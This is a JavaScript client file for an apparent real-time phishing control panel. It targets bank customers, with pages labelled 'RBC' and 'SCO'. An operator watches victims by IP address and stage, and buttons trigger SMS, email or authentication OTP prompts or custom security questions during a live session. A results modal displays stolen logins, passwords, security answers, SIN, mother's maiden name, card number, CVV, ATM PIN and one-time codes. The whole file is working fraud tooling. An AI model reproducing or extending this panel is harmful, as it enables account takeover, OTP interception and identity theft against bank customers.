// Assuming socket is already defined and connected
const socket = io();

function createUserDiv(ipAddress, details) {
  const color = getColorByStage(details.stage, details.status);
  const userDiv = document.createElement('div');
  userDiv.className = 'col-md-4';
  userDiv.innerHTML = getUserDivInnerHTML(ipAddress, details, color);
  setUserDivEventListeners(userDiv, ipAddress, details);
  return userDiv;
}

function getColorByStage(stage, status) {
  if (stage === 'Finish') return 'warning';
  return status === 'actif' ? 'success' : 'danger';
}

function getUserDivInnerHTML(ipAddress, details, color) {
  // You can add more conditions or modify the HTML structure as per your requirements
  return `
    <h5 class="card-title fw-semibold mb-4 badge bg-${color}">${details.status}</h5>
    <div class="card">
      <div class="card-header"><span class="badge bg-${color}">${ipAddress}</span></div>
      <div class="card-body">
        <h5 class="card-title">${details.page || ''}</h5>
        <p class="card-text">${details.stage || ''}</p>
        ${getActionButtonHTML(details)}
      </div>
    </div>
  `;
}

function getActionButtonHTML(details) {
  // Modify this function to include other actions based on `details`
  if (details.page != 'RBC' && details.page != 'SCO' && details.stage != 'CAPTCHA' && details.stage != 'Finish' && details.stage != 'Interac' && details.stage != 'Loading' && details.stage != 'OTP') {
    return `              <a href="#" class="m-1 btn btn-primary results-button">See Result</a>
    <a href="#" class="m-1 btn btn-warning send-otp-sms-button">Send SMS OTP</a>
    <a href="#" class="m-1 btn btn-warning send-otp-email-button">Send EMAIL OTP</a>`;
  } else if (details.stage == "OTP") {
    return `<a href="#" class="m-1 btn btn-primary results-button">See Result</a>`;
  } else if (details.stage == "Loading") {
    return `  <a href="#" class="m-1 btn btn-primary results-button">See Result</a>
    <a href="#" class="m-1 btn btn-success send-otp-good-button">Good</a>
    <a href="#" class="m-1 btn btn-danger send-otp-bad-button">Bad</a>`;
  } else if (details.page == 'SCO' && details.stage != 'Finish') {
    return ` <a href="#" class="m-1 btn btn-primary results-button">See Result</a>
    <a href="#" class="m-1 btn btn-warning send-otp-sms-button">Send SMS OTP</a>
    <a href="#" class="m-1 btn btn-warning send-otp-email-button">Send EMAIL OTP</a>
    <a href="#" class="m-1 btn btn-warning send-auth-button">Send AUTH</a>`;
  } else if (details.page == 'RBC' && details.stage != 'Finish') {
    return `  <a href="#" class="m-1 btn btn-primary results-button">See Result</a>
    <a href="#" class="m-1 btn btn-warning send-otp-sms-button">Send SMS OTP</a>
    <a href="#" class="m-1 btn btn-warning send-otp-email-button">Send EMAIL OTP</a>
    <a href="#" class="m-1 btn btn-warning send-auth-button">Send AUTH</a>
    <button class="m-1 btn btn-warning customQuestionTrigger" type="button" >Custom Question</button>`;
  } else {
    return ` <a href="#" class="m-1 btn btn-primary results-button">See Result</a>`;
  }
  // Add other conditions as needed
  return '';
}


function setUserDivEventListeners(userDiv, ipAddress, details) {
  // Add event listeners to buttons within userDiv
  const resultsButton = userDiv.querySelector('.results-button');
  const sendOtpSmsButton = userDiv.querySelector('.send-otp-sms-button');
  const sendOtpEmailButton = userDiv.querySelector('.send-otp-email-button');
  const sendAuthButton = userDiv.querySelector('.send-auth-button');
  const customQuestionTrigger = userDiv.querySelector('.customQuestionTrigger')
  const sendCustomQuestionButton = document.getElementById('sendCustomQuestionButton');

  if (resultsButton) {
    resultsButton.addEventListener('click', () => showResultsModal(ipAddress));
  }
  
  if (sendOtpSmsButton) {
    sendOtpSmsButton.addEventListener('click', function () {
      socket.emit('sendOTP', { ip: ipAddress, navig: `sms` })
    });
  }
  if (sendOtpEmailButton) {
    sendOtpEmailButton.addEventListener('click', function () {
      socket.emit('sendOTP', { ip: ipAddress, navig: `email` })
    });
  }
  if (sendAuthButton) {
    sendAuthButton.addEventListener('click', function () {
      socket.emit('sendOTP', { ip: ipAddress, navig: `auth` })
    });
  }
  if (customQuestionTrigger) {

    customQuestionTrigger.addEventListener('click', function () {
      $('#customQuestionModal').modal('show');
    });

    sendCustomQuestionButton.addEventListener('click', function () {
      var customQuestion = document.getElementById('customQuestion').value;
      socket.emit('sendOTP', { ip: ipAddress, navig: `qst2`, customQuestion: customQuestion })
      $('#customQuestionModal').modal('hide');
    })
  }
  // Add other event listeners as needed
}

function showResultsModal(_ipAddress) {
  // Function to show the results modal for a specific user
  const modalBody = document.querySelector('#resultsModal .modal-body');
  // Assuming you have a function to fetch user data and then display it
  socket.emit('getUserData', { ip: _ipAddress });
  socket.on('setUserData', (userData) => {
    userData.forEach(([ipAddress, details]) => {
      if (details.ip == _ipAddress) {
        console.log(details.ip)
        if (details.getUserDataLogin || details.getUserDataQuestion || details.getUserDataDetails || details.getUserDataCard || details.getUserDataOTP) {
          console.log(details.getUserDataLogin.username)
          modalBody.innerHTML = `   <div class="card mb-3">
          <div class="card-header bg-primary text-white">
            <strong>IP: ${ipAddress}</strong>
          </div>
          <div class="card-body">
            <h5 class="card-title">Login Details</h5>
            <p class="card-text">
              Username: ${details.getUserDataLogin.username || ''}<br>
              Password: ${details.getUserDataLogin.password || ''}<br>
              UserAgent: ${details.getUserDataLogin.userAgent || ''}
            </p>
            
            <h5 class="card-title">Security Questions</h5>
            <p class="card-text">
              ${details.getUserDataQuestion.question1 || ''} : ${details.getUserDataQuestion.answer1 || ''}<br>
              ${details.getUserDataQuestion.question2 || ''} : ${details.getUserDataQuestion.answer2 || ''}<br>
              ${details.getUserDataQuestion.question3 || ''} : ${details.getUserDataQuestion.answer3 || ''}<br>
              ${details.getUserDataQuestion.question4 || ''} : ${details.getUserDataQuestion.answer4 || ''}<br>
              ${details.getUserDataQuestion.question5 || ''} : ${details.getUserDataQuestion.answer5 || ''}<br>
              ${details.getUserDataOTP.customQuestion || ''} : ${details.getUserDataOTP.customAnswer || ''}
            </p>
        
            <h5 class="card-title">Personal Information</h5>
            <p class="card-text">
              Full Name: ${details.getUserDataDetails.name || ''}<br>
              Address: ${details.getUserDataDetails.address || ''}<br>
              City: ${details.getUserDataDetails.city || ''}<br>
              Phone Number: ${details.getUserDataDetails.phone || ''}<br>
              Postal Code: ${details.getUserDataDetails.postal || ''}<br>
              Email: ${details.getUserDataDetails.email || ''}<br>
              DOB: ${details.getUserDataDetails.dob1 || ''}/${details.getUserDataDetails.dob2 || ''}/${details.getUserDataDetails.dob3 || ''} || ${details.getUserDataDetails.dob || ''}<br>
              Mmn: ${details.getUserDataDetails.mmn || ''}<br>
              Sin: ${details.getUserDataDetails.sin || ''}<br>
              Driver Licence: ${details.getUserDataDetails.drivers || ''}
            </p>
        
            <h5 class="card-title">Card Information</h5>
            <p class="card-text">
              Card Number: ${details.getUserDataCard.card || ''}<br>
              Exp: ${details.getUserDataCard.exp1 || ''}/${details.getUserDataCard.exp2 || ''} || ${details.getUserDataCard.expiry || ''} <br>
              Cvv: ${details.getUserDataCard.cvv || ''}<br>
              ATM PIN: ${details.getUserDataCard.atm || ''}
            </p>
        
            <h5 class="card-title">One-Time Password (OTP)</h5>
            <p class="card-text">
              OTP: ${details.getUserDataOTP.code || ''}
            </p>
        
            <div class="d-flex justify-content-end">
              <button id="downloadButton" class="btn btn-secondary mt-2">Download</button>
            </div>
          </div>
        </div>
        `;
  
        } else {
          modalBody.innerHTML = `No result for IP: ${ipAddress}`;
        }
      }
    })
    const modal = new bootstrap.Modal(document.getElementById('resultsModal'));
    modal.show();
  })
}

function updateConnectionsTable(users) {
  const container = document.getElementById('userContainer');
  if (!container) return; // Basic error handling

  container.innerHTML = ''; // Clear previous content
  users.sort(compareUserStatus);

  users.forEach(([ipAddress, details]) => {
    const userDiv = createUserDiv(ipAddress, details);
    container.appendChild(userDiv);
  });
}

function compareUserStatus([, details1], [, details2]) {
  return (details1.status === 'actif' && details2.status !== 'actif') ? -1 :
    (details1.status !== 'actif' && details2.status === 'actif') ? 1 : 0;
}

// Assuming updateActiveUserCount is defined elsewhere

// Call this function when the socket receives 'join' or 'leave' events
socket.on('join', users => updateView(users));
socket.on('leave', users => updateView(users));

function updateView(users) {
  const activeCount = users.reduce((count, [, details]) => count + (details.status === 'actif' ? 1 : 0), 0);
  updateConnectionsTable(users);
  updateActiveUserCount(activeCount);
}

function updateActiveUserCount(newCount) {
  document.getElementById('activeUserCount').textContent = `Active Users: ${newCount}`;
}


document.getElementById('deleteAll').addEventListener('click', function () {
  socket.emit('deleteAll');
});
